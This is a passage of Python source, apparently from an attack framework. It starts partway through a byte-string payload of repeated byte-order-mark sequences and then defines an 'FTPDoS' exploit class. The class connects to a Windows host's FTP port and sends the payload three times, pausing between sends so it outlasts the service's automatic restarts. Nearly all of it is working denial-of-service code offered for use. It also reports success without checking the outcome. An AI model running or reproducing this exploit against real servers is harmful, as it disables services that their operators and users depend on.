f\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf'

class FTPDoS(Exploit):
    '''Class for performing the FTP DoS exploit'''

    def __init__(self, server_ip: str):
        super().__init__(
            os='windows',
            name='DoS/turn off FTP service',
            description='',
            requirements=['ftp'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target to turn off the FTP service'''

        # TODO: error handling
        # Windows will auto restart the service after the first two fails, so run it three times
        for i in range(3):
            # Connect to FTP server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.message(target, 'Sending payload...')
                s.connect((target, 21))
                data = s.recv(1024)
                # Send payload
                s.send(payload + b'\r\n')
                s.close()
                self.message(target, 'Successful DoS #{i+1}')
            except ConnectionRefusedError:
                self.message(target, 'Couldn\'t connect to socket')
            
            # Give enough time for service to restart the first two times
            if i < 2:
                self.message(target, 'Giving time for service to restart...')
                time.sleep(5)
            
            # TODO: check that FTP is actually down
            self.success(target)
